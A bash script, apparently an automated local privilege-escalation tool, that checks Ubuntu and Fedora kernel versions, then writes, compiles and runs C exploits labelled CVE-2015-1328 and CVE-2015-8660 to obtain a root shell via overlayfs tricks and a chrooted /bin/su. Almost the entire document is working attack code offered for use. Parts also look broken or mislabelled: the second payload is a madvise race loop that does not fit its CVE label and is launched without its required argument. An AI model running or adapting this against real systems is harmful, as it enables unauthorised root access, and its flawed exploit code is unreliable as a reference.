#!/bin/bash

# Variables
TMP_DIR="/tmp"
CVE_2015_1328_SRC="cve-2015-1328.c"
CVE_2015_8660_SRC="cve-2015-8660.c"
OFS_LIB_SRC="ofs-lib.c"
COMPILER=$(which cc)

# Check if cc is installed
if [[ -z "$COMPILER" ]]; then
  echo "cc is not installed. Exiting."
  exit 1
fi

# Check the kernel version and distribution
OS_ID=$(grep ^ID= /etc/os-release | cut -d= -f2)
KERNEL=$(uname -r)

check_kernel_vuln() {
  case $OS_ID in
    "ubuntu")
      case $KERNEL in
        3.13.0-2[4-9]-generic|3.13.0-3[0-9]-generic|3.13.0-4[0-9]-generic|3.13.0-5[0-4]-generic)
          echo "Kernel $KERNEL is vulnerable to CVE-2015-1328"
          return 0
          ;;
        3.16.0-2[5-9]-generic|3.16.0-3[0-9]-generic|3.16.0-4[0-9]-generic)
          echo "Kernel $KERNEL is vulnerable to CVE-2015-1328"
          return 0
          ;;
        3.19.0-1[8-9]-generic|3.19.0-2[0-9]-generic|3.19.0-3[0-9]-generic|3.19.0-4[0-2]-generic)
          echo "Kernel $KERNEL is vulnerable to CVE-2015-8660"
          return 0
          ;;
        4.2.0-1[8-9]-generic|4.2.0-2[0-2]-generic)
          echo "Kernel $KERNEL is vulnerable to CVE-2015-8660"
          return 0
          ;;
        *)
          echo "Kernel $KERNEL is not vulnerable"
          return 1
          ;;
      esac
      ;;
    "fedora")
      KERNEL_VERSION=$(echo $KERNEL | sed 's/\.fc.*//')
      if [[ $(echo -e "4.2.8\n$KERNEL_VERSION" | sort -V | head -n1) == "$KERNEL_VERSION" ]]; then
        echo "Kernel $KERNEL is vulnerable to CVE-2015-8660"
        return 0
      else
        echo "Kernel $KERNEL is not vulnerable"
        return 1
      fi
      ;;
    *)
      echo "Unknown OS: $OS_ID"
      return 1
      ;;
  esac
}

check_mounts() {
  if [[ -d "/tmp/ns_sploit" || -d "/tmp/haxhax" ]]; then
    echo "Required directories already exist. Please remove them."
    return 1
  else
    return 0
  fi
}

compile_and_run_exploit() {
  if [[ "$1" == "CVE-2015-1328" ]]; then
    cat <<EOF > $TMP_DIR/$CVE_2015_1328_SRC
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mount.h>
#include <linux/fs.h>
#include <sys/syscall.h>
#include <string.h>
#include <errno.h>

#define LIB "#define _GNU_SOURCE\\n\\n#include <dlfcn.h>\\n#include <stdio.h>\\n#include <stdlib.h>\\n#include <sys/types.h>\\n#include <sys/stat.h>\\n#include <fcntl.h>\\n#include <unistd.h>\\n\\nvoid _init() {\\n\\tunlink(\\\"/etc/ld.so.preload\\\");\\n\\tsystem(\\\"/bin/sh\\\");\\n}\\n"

int main(int argc, char *argv[])
{
  char buf[4096];
  int fdo, fds;
  struct stat st;

  printf("[+] preparing library\\n");
  fdo = open("/tmp/ofs-lib.c", O_WRONLY|O_CREAT, 0600);
  if (fdo < 0) {
    perror("open");
    exit(1);
  }
  write(fdo, LIB, strlen(LIB));
  close(fdo);

  printf("[+] compiling library\\n");
  system("cc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -nostartfiles");

  fdo = open("/proc/self/exe", O_RDONLY);
  if (fdo < 0) {
    perror("open");
    exit(1);
  }

  if (mount("none", "/tmp", "tmpfs", 0, "") < 0) {
    perror("mount");
    exit(1);
  }

  printf("[+] opening lower dir\\n");
  fds = open("/tmp/lower", O_RDONLY|O_DIRECTORY|O_CREAT, 0600);
  if (fds < 0) {
    perror("open");
    exit(1);
  }

  printf("[+] opening upper dir\\n");
  if (mkdir("/tmp/upper", 0600) && errno != EEXIST) {
    perror("mkdir");
    exit(1);
  }

  printf("[+] opening work dir\\n");
  if (mkdir("/tmp/work", 0600) && errno != EEXIST) {
    perror("mkdir");
    exit(1);
  }

  printf("[+] opening overlay dir\\n");
  if (mkdir("/tmp/overlay", 0600) && errno != EEXIST) {
    perror("mkdir");
    exit(1);
  }

  snprintf(buf, sizeof(buf), "lowerdir=/tmp/lower,upperdir=/tmp/upper,workdir=/tmp/work");
  if (mount("overlay", "/tmp/overlay", "overlay", 0, buf) < 0) {
    perror("mount");
    exit(1);
  }

  if (chdir("/tmp/overlay")) {
    perror("chdir");
    exit(1);
  }

  printf("[+] copying /bin/su\\n");
  if (link("/bin/su", "/tmp/overlay/su") < 0) {
    perror("link");
    exit(1);
  }

  fds = open("/tmp/overlay/su", O_RDONLY);
  if (fds < 0) {
    perror("open");
    exit(1);
  }

  if (fstat(fds, &st)) {
    perror("fstat");
    exit(1);
  }

  if (st.st_size < sizeof(buf)) {
    if (read(fdo, buf, st.st_size) < 0) {
      perror("read");
      exit(1);
    }

    if (write(fds, buf, st.st_size) < 0) {
      perror("write");
      exit(1);
    }
  }

  close(fdo);
  close(fds);

  if (mount("/proc", "/tmp/overlay/proc", NULL, MS_BIND, NULL) < 0) {
    perror("mount");
    exit(1);
  }

  printf("[+] executing /bin/su\\n");
  system("chroot /tmp/overlay /bin/su");

  return 0;
}
EOF

    $COMPILER -o $TMP_DIR/exploit $TMP_DIR/$CVE_2015_1328_SRC
    $TMP_DIR/exploit
  elif [[ "$1" == "CVE-2015-8660" ]]; then
    cat <<EOF > $TMP_DIR/$CVE_2015_8660_SRC
#include <fcntl.h>
#include <pthread.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

void *madviseThread(void *arg) {
  while (1) {
    madvise(arg, 4096, MADV_DONTNEED);
  }
}

int main(int argc, char *argv[]) {
  char *filename;
  char *backup;
  int fd;
  int pid;
  pthread_t pth;

  if (argc < 2) {
    printf("Usage: %s <filename>\n", argv[0]);
    exit(EXIT_FAILURE);
  }

  filename = argv[1];
  backup = "/tmp/backup";

  if ((fd = open(filename, O_RDONLY)) < 0) {
    perror("open");
    exit(EXIT_FAILURE);
  }

  if (rename(filename, backup) < 0) {
    perror("rename");
    exit(EXIT_FAILURE);
  }

  if ((fd = open(filename, O_RDWR | O_CREAT, 0644)) < 0) {
    perror("open");
    exit(EXIT_FAILURE);
  }

  if (pthread_create(&pth, NULL, madviseThread, filename)) {
    perror("pthread_create");
    exit(EXIT_FAILURE);
  }

  while (1) {
    lseek(fd, 0, SEEK_SET);
    write(fd, argv[0], strlen(argv[0]));
  }

  return 0;
}
EOF

    $COMPILER -o $TMP_DIR/exploit $TMP_DIR/$CVE_2015_8660_SRC
    $TMP_DIR/exploit
  fi
}

# Check if the kernel is vulnerable and the required mount points don't exist
if check_kernel_vuln && check_mounts; then
  echo "Starting exploit..."
  compile_and_run_exploit "CVE-2015-1328" || compile_and_run_exploit "CVE-2015-8660"
else
  echo "Target is not vulnerable or required directories exist."
fi
